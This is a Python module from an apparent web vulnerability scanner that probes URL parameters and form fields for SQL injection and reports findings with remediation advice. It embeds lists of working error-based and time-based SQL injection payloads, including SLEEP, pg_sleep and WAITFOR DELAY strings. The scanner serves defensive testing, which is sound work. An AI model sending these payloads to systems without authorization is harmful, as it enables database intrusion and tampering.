from __future__ import annotations
import time
from urllib.parse import urlparse
from .base import BaseModule
from ..scanner import Finding, HIGH, mutate_query, SQL_ERRORS

class SQLInjectionModule(BaseModule):
    name = "SQL Injection"
    category = "Injection"

    def run(self):
        for url in list(self.scanner.pages):
            self._check_url(url)
        
        for form in self.scanner.forms:
            self._check_form(form)

    def _check_url(self, url):
        parsed = urlparse(url)
        from urllib.parse import parse_qsl
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        
        for param in params:
            # 1. Error-based
            self._test_error_based(url, param, "GET")
            # 2. Time-based
            self._test_time_based(url, param, "GET")

    def _check_form(self, form):
        for param in form.inputs:
            self._test_error_based(form.action, param, form.method, form.inputs)
            self._test_time_based(form.action, param, form.method, form.inputs)

    def _test_error_based(self, url, param, method, base_data=None):
        payloads = [
            "'", "\"", "')", "\")", "'))", "\"))",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--",
            "' OR 1=1#", "\" OR 1=1#",
            "\\", "%%", "%' OR '1'='1",
            "')) OR 1=1--",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
        ]
        # Get baseline to avoid flagging errors already on page
        baseline = self.scanner.pages.get(url)
        baseline_text = baseline.text.lower() if baseline else ""
        
        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res: continue
            
            res_text = res.text.lower()
            for error in SQL_ERRORS:
                if error in res_text and error not in baseline_text:
                    self._report(url, param, method, payload, f"New SQL error message appeared in response: {error}")
                    return

    def _test_time_based(self, url, param, method, base_data=None):
        payloads = [
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "'); SELECT SLEEP(5)--",
            "'); SELECT pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) FROM DUAL--",
        ]
        for payload in payloads:
            start = time.monotonic()
            res = self._send_payload(url, param, method, payload, base_data)
            duration = time.monotonic() - start
            
            if duration >= 5:
                self._report(url, param, method, payload, "Time-based SQLi detected (server delayed for 5+ seconds).")
                return

    def _send_payload(self, url, param, method, payload, base_data=None):
        if method == "GET":
            target_url = mutate_query(url, param, payload)
            return self.scanner._request("GET", target_url)
        else:
            data = dict(base_data) if base_data else {}
            data[param] = payload
            return self.scanner._request("POST", url, data=data)

    def _report(self, url, param, method, payload, evidence):
        self.add_finding(Finding(
            id="SQLI-001",
            name="SQL Injection",
            category="SQL Injection",
            severity=HIGH,
            confidence="High",
            url=url,
            parameter=param,
            method=method,
            evidence=evidence,
            trigger=f"payload={payload}",
            impact="Observed database error behavior suggests this input may reach a backend query unsafely. If confirmed, attackers could read or alter database-held data.",
            remediation="Use parameterized queries and prepared statements.",
            cwe="CWE-89"
        ))
